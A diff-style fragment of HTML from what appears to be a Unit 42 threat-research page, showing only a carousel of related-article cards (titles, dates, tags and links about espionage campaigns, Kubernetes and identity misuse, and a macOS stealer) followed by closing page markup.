+					<a href="https://unit42.paloaltonetworks.com/tag/exfiltration/" title="exfiltration" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:AI-Powered Espionage Campaign Targets Government Linux Infrastructure:exfiltration">Exfiltration</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/llm/" title="LLM" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:AI-Powered Espionage Campaign Targets Government Linux Infrastructure:LLM">LLM</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/network-security/" title="network security" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:AI-Powered Espionage Campaign Targets Government Linux Infrastructure:network security">Network security</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/" title="AI-Powered Espionage Campaign Targets Government Linux Infrastructure" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:AI-Powered Espionage Campaign Targets Government Linux Infrastructure:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                          <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Blinder Tunnel Campaign Targets Iraqi Infrastructure:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-10-06T10:00:33+00:00">October 6, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Blinder Tunnel Campaign Targets Iraqi Infrastructure">
+                    <h4 class="post-title">Blinder Tunnel Campaign Targets Iraqi Infrastructure</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/advanced-persistent-threat/" title="Advanced Persistent Threat" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Blinder Tunnel Campaign Targets Iraqi Infrastructure:Advanced Persistent Threat">Advanced Persistent Threat</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/agent-serpens/" title="Agent Serpens" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Blinder Tunnel Campaign Targets Iraqi Infrastructure:Agent Serpens">Agent Serpens</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/appdomainmanager/" title="AppDomainManager" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Blinder Tunnel Campaign Targets Iraqi Infrastructure:AppDomainManager">AppDomainManager</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/" title="Blinder Tunnel Campaign Targets Iraqi Infrastructure" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Blinder Tunnel Campaign Targets Iraqi Infrastructure:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:OperTraitors: How Kubernetes Operators Betray Your Security Posture:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-09-29T10:00:48+00:00">September 29, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/agentic-ai-kubernetes-operator-risks/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:OperTraitors: How Kubernetes Operators Betray Your Security Posture">
+                    <h4 class="post-title">OperTraitors: How Kubernetes Operators Betray Your Security Posture</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/ai/" title="AI" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:OperTraitors: How Kubernetes Operators Betray Your Security Posture:AI">AI</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/ai-agents/" title="AI agents" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:OperTraitors: How Kubernetes Operators Betray Your Security Posture:AI agents">AI agents</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/api/" title="API" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:OperTraitors: How Kubernetes Operators Betray Your Security Posture:API">API</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/agentic-ai-kubernetes-operator-risks/" title="OperTraitors: How Kubernetes Operators Betray Your Security Posture" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:OperTraitors: How Kubernetes Operators Betray Your Security Posture:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/insights/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Atomic macOS (AMOS) Stealer Activity:Insights"><span class="">Insights</span></a>                        <span class="post-pub-date"><time datetime="2026-09-16T10:00:06+00:00">September 16, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Atomic macOS (AMOS) Stealer Activity">
+                    <h4 class="post-title">Atomic macOS (AMOS) Stealer Activity</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/macos/" title="macOS" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Atomic macOS (AMOS) Stealer Activity:macOS">MacOS</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/threat-intelligence/" title="threat intelligence" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Atomic macOS (AMOS) Stealer Activity:threat intelligence">Threat intelligence</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/unit-42/" title="Unit 42" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Atomic macOS (AMOS) Stealer Activity:Unit 42">Unit 42</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/" title="Atomic macOS (AMOS) Stealer Activity" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:Atomic macOS (AMOS) Stealer Activity:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                <div class="pa l-card l-card--slider">
+              <div class="card-media ">
+                              <figure>
+                                </figure> 
+                            </div>
+              <div class="card-content">
+                <div class="card-content__wrapper">
+                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE:Threat Research"><span class="">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2026-09-10T10:00:43+00:00">September 10, 2026</time></span>
+                  <a href="https://unit42.paloaltonetworks.com/kubernetes-spiffe-spire-identity-spoofing/" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE">
+                    <h4 class="post-title">The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE</h4>
+                  </a>
+                  <ul class="card-tags" role="list">
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/api/" title="API" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE:API">API</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/cryptographic/" title="cryptographic" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE:cryptographic">Cryptographic</a>
+				</li>
+				<li role="listitem">
+					<a href="https://unit42.paloaltonetworks.com/tag/json/" title="JSON" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE:JSON">JSON</a>
+				</li></ul>                </div>
+                <div class="card-content__link">
+                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/kubernetes-spiffe-spire-identity-spoofing/" title="The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE" role="link" data-page-track="true" data-page-track-value="fortimanager-cve-2024-47575-peerstitch-malware:related-resources:The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE:read now">
+                    Read now                    
+                  </a>
+                </div>
+              </div>
+            </div>
+                                    </div>
+    </div>
+    <div class="l-container bs__controls">
+      <div class="bs__progress"><span></span></div>
+      <div class="bs__navigation"> 
+        <ul>
+          <li> 
+            
+          </li>
+          <li> 
+            
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+ 
+        <div class="be-enlarge-modal" id="enlargedModal">
+          <div class="be-enlarge-modal__wrapper"> 
+            <figure> 
+              
+              
+              <figcaption> </figcaption>
+            </figure>
+          </div>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+
+</body></html>
